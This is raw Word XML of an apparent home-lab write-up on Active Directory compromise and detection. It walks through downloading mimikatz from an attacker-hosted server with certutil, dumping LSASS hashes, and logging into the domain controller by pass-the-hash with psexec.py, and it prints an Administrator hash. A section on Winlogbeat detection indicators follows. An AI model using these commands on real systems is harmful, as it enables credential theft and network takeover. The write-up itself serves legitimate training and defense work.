    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D3EEB42" wp14:editId="61D4182B">
            <wp:extent cx="5486400" cy="20497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049780"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0563C1" w:themeColor="hyperlink"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the picture above we need first download </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mimikatz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to our target machine. So first we open python server on attacker machine and then from the target machine we use the command : certutil.exe -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>urlcache</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f </w:t>
      </w:r>
      <w:hyperlink r:id="rId90" w:history="1">
        <w:r w:rsidRPr="00247098">
          <w:rPr>
            <w:color w:val="0563C1" w:themeColor="hyperlink"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://10.0.0.14/mimikatz.exe mimikatz.exe</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0563C1" w:themeColor="hyperlink"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003D55EA" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">                     </w:t>
      </w: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247098" w:rsidRPr="00944C35" w:rsidRDefault="00247098" w:rsidP="00944C35">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Mimikatz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0563C1" w:themeColor="hyperlink"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41214C6C" wp14:editId="357DA11A">
            <wp:extent cx="4973708" cy="3505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3598" cy="3519217"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the picture above we now running </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mimikatz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and we use 2 commands first: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00AF45AB">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>privilege:</w:t>
      </w:r>
      <w:r w:rsidR="00AF45AB" w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which check if we got admin privilege to run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mimikatz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the second command : </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sekurlsa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>logonpassword</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which module that dump all the hashes from the memory which called lsass.exe. </w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ow let’s check what result</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> we got and maybe we dump the administrator hash of the domain.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B501531" wp14:editId="6A49B112">
            <wp:extent cx="5486400" cy="37255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725545"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="00247098" w:rsidRDefault="00247098" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>From the picture above we successful dump all the hashes from the memory and we also find new hash of the Administrator – ‘26b74cc48f843cbbd08625f3935dda3f’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Maybe this the hash of the domain admin let’s check if we can get shell from this credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C14D0D" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C14D0D" w:rsidRDefault="00C14D0D" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00944C35">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Mimikatz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Detection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="03E7E2EC" wp14:editId="71F92750">
            <wp:extent cx="5486400" cy="186541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865414"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00914BA8" w:rsidRPr="00914BA8" w:rsidRDefault="00914BA8" w:rsidP="00914BA8">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00914BA8">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Here above we got log from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00914BA8">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>winlogbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00914BA8">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which show us the executable mimikatz.exe running from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00914BA8">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fcastle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00914BA8">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> user directory and also I marked in red rule that show </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00914BA8">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mitre</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00914BA8">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> technique which windows command shell, and also we see </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00914BA8">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mimiakatz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00914BA8">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> running from cmd.exe which also very suspicious.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00914BA8" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0563C1" w:themeColor="hyperlink"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1337E007" wp14:editId="619A2915">
            <wp:extent cx="5486400" cy="14579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457960"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B546B2" w:rsidRPr="00B546B2" w:rsidRDefault="00B546B2" w:rsidP="00B546B2">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
          <w:tab w:val="left" w:pos="1045"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B546B2">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Here above we got the second alert from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B546B2">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>winlogbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B546B2">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which show us that the process mimikatz.exe make process access to target image which lsass.exe.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B546B2" w:rsidRDefault="00B546B2" w:rsidP="00B546B2">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
          <w:tab w:val="left" w:pos="1045"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B546B2">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">The indicators that show us that was hash dumping </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="00B546B2">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> first by process access to lsass.exe the second it’s the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B546B2">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>GrantedAccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B546B2">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B546B2">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x1010.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="00944C35" w:rsidRDefault="009969E7" w:rsidP="009969E7">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>PSEXEC.py</w:t>
      </w:r>
      <w:r w:rsidR="00C14D0D" w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>(With Administrator)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRDefault="00D04322" w:rsidP="009969E7">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48187751" wp14:editId="6D8AEAD3">
            <wp:extent cx="5486400" cy="22371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2237105"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="009969E7" w:rsidRDefault="00E7245A" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>It</w:t>
      </w:r>
      <w:r w:rsidR="009969E7" w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Works! Now we get access to the administrator of the domain which mean we Owned all the network and all the systems inside. The command we use above on the picture: psexec.py administrator@10.10.1.100 -hashes 26b74cc48f843cbbd08625f3935dda3f:26b74cc48f843cbbd08625f3935dda3f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="009969E7" w:rsidRDefault="009969E7" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Psexec.py – python script for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>psexec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> from one system to another for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="009969E7" w:rsidRDefault="009969E7" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Administrator of the domain which s</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> on 10.10.1.100</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="009969E7" w:rsidRDefault="009969E7" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">-hashes we just put the hash twice that we find from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mimikatz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="009969E7" w:rsidRDefault="009969E7" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now let’s make list and see how many computers the attacker </w:t>
      </w:r>
      <w:r w:rsidR="00AF45AB" w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>compromised:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="009969E7" w:rsidRDefault="009969E7" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Ubuntu18 - 10.10.0.9 – got root shell – Owned</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="009969E7" w:rsidRDefault="009969E7" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Windows10 – 10.10.0.6 – </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>pparker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> domain user got credentials – Owned</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="009969E7" w:rsidRDefault="009969E7" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Windows10 – 10.10.0.8 – </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fcastle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> domain user got credentials – Owned</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="009969E7" w:rsidRDefault="009969E7" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Windows-Server – 10.10.1.100 – Administrator got hash –Owned</w:t>
      </w:r>
    </w:p>
